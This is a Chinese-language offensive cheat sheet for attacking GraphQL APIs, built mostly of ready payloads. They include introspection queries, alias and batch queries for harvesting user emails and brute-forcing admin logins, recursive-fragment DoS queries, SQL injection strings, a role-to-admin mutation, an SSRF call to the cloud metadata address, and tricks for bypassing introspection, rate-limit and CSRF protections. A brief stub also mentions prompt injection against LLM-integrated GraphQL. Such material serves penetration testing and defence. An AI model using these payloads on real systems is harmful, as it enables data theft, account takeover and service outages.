# GraphQL 攻击

## 原理

GraphQL 是一种用于 API 的查询语言，攻击者可通过 Introspection、批量查询、字段建议、注入等手段获取敏感信息、绕过认证、DoS 等。

## 攻击链

### 1. 识别 GraphQL

```http
# 常见端点
/graphql
/graphiql
/api/graphql
/v1/graphql
/v2/graphql
/query
/playground

# 探测
POST /graphql HTTP/1.1
Content-Type: application/json

{"query":"{__typename}"}
```

### 2. Introspection（内省）

```graphql
# 获取所有类型
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
        }
      }
    }
  }
}

# 获取所有 query 和 mutation
{
  __schema {
    queryType {
      name
      fields {
        name
        args {
          name
          type {
            name
          }
        }
      }
    }
    mutationType {
      name
      fields {
        name
      }
    }
  }
}
```

### 3. 获取敏感字段

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        type {
          name
          kind
          ofType {
            name
          }
        }
      }
    }
  }
}
```

### 4. 批量查询攻击

```json
# 批量查询
[
  {"query": "query { user(id:1) { email } }"},
  {"query": "query { user(id:2) { email } }"},
  {"query": "query { user(id:3) { email } }"}
]

# 别名攻击
{
  user1: user(id:1) { email }
  user2: user(id:2) { email }
  user3: user(id:3) { email }
  # ... 1000 个别名
}
```

### 5. DoS 攻击

```graphql
# 深度嵌套
{
  user {
    friends {
      friends {
        friends {
          friends {
            # ... 深度嵌套
          }
        }
      }
    }
  }
}

# 片段循环
{
  user {
    ...frag1
  }
}
fragment frag1 on User {
  ...frag2
}
fragment frag2 on User {
  ...frag1
}
```

### 6. SQL 注入

```graphql
# 通过参数注入
query {
  user(name: "' UNION SELECT password FROM users--") {
    id
    name
  }
}

# 通过变量
{"query": "query GetUser($name: String!) { user(name: $name) { id } }", "variables": {"name": "' OR 1=1--"}}
```

### 7. 认证绕过

```graphql
# 通过 mutation 修改字段
mutation {
  updateUser(id: 1, input: {role: "admin"}) {
    id
    role
  }
}

# 通过别名绕过限流
{
  a: login(user:"admin", pass:"pass1")
  b: login(user:"admin", pass:"pass2")
  # ... 暴力破解
}
```

### 8. 字段建议

```graphql
# 故意拼错字段名，获取建议
query {
  user { emial }  # 拼错
}
# 响应：Did you mean "email"?
```

### 9. 持久化查询

```http
# 通过 hash 查询
GET /graphql?extensions={"persistedQuery":{"sha256Hash":"abc123","version":1}}

# 如果 hash 不存在，服务器要求发送完整查询
# 然后可以重放
```

### 10. SSRF

```graphql
# 通过 URL 字段
mutation {
  importFromUrl(url: "http://169.254.169.254/latest/meta-data/")
}
```

## 各 GraphQL 服务器漏洞

### Apollo Server

```javascript
# Introspection 默认开启（生产环境应关闭）
# CSRF：默认不验证 Content-Type
# 通过 GET 请求触发 CSRF
GET /graphql?query={__typename}
```

### Graphene (Python)

```python
# Django + Graphene
# 通过 Django ORM 注入
```

### graphql-ruby

```ruby
# Ruby on Rails
# 通过 ActiveRecord 注入
```

### Hasura

```graphql
# Hasura GraphQL Engine
# 通过 metadata API 注入
# 通过 remote schema 注入
```

## 绕过技巧

### 1. Introspection 禁用

```graphql
# 通过字段建议获取字段名
query { user { emial } }
# 响应：Did you mean "email"?

# 通过 __type 获取类型
{
  __type(name: "User") {
    name
    fields {
      name
    }
  }
}

# 通过错误信息
query { nonExistentField }

# 通过 Clairvoyance 工具自动发现
# https://github.com/nikitastupin/clairvoyance
```

### 2. 深度限制

```graphql
# 通过片段绕过
query {
  user {
    ...userFields
  }
}
fragment userFields on User {
  friends {
    ...friendFields
  }
}
fragment friendFields on User {
  friends {
    # ...
  }
}
```

### 3. 限流绕过

```graphql
# 通过别名绕过
{
  a: user(id:1)
  b: user(id:2)
  # ...
}

# 通过批量查询绕过
[
  {"query": "..."},
  {"query": "..."}
]
```

### 4. CSRF 防护绕过

```http
# 如果服务器接受 GET 请求
GET /graphql?query={__typename}

# 通过 JSONP
# 通过 XHR
```

## 2024-2026 新技术点

### 1. GraphQL Federation 攻击

```graphql
# Apollo Federation
# 通过 _entities 字段攻击
# 通过 _service 字段获取 SDL
{
  _service {
    sdl
  }
}
```

### 2. GraphQL Subscriptions 攻击

```graphql
# WebSocket 订阅
# 通过 subscription 注入
subscription {
  newMessage {
    id
    content
  }
}
```

### 3. GraphQL over WebSocket

```javascript
# 通过 WebSocket 发送查询
# 绕过 HTTP 限流
```

### 4. GraphQL Code Generator 漏洞

```javascript
# 通过生成的客户端代码注入
# 模板注入
```

### 5. GraphQL Persisted Queries

```http
# 通过 hash 重放
# 通过 hash 碰撞
```

### 6. GraphQL + AI

```graphql
# LLM 集成 GraphQL
# 通过 prompt injection 操纵查询
# 通过工具调用泄露数据
```

### 7. GraphQL Mesh

```graphql
# 多数据源聚合
# 通过 transform 注入
```

### 8. 现代 GraphQL 服务器

```javascript
# Yoga GraphQL
# Pylon
# 各服务器的新特性
```

### 9. GraphQL 缓存投毒

```http
# 通过 CDN 缓存 GraphQL 响应
# 通过 query hash 操纵
```

### 10. GraphQL + OAuth

```http
# 通过 OAuth token 操纵 GraphQL
# 通过 scope 提权
```

## 工具推荐

- **GraphQL Voyager** — 可视化 schema
- **GraphQL Playground** — 交互式查询
- **GraphiQL** — IDE
- **Clairvoyance** — 自动发现 schema
- **GraphQL Cop** — 安全扫描
- **InQL** (Burp 插件) — GraphQL 扫描
- **graphw00f** — GraphQL 服务器指纹

## 参考链接

- [PortSwigger GraphQL](https://portswigger.net/web-security/graphql)
- [GraphQL Security](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [PayloadsAllTheThings - GraphQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection)
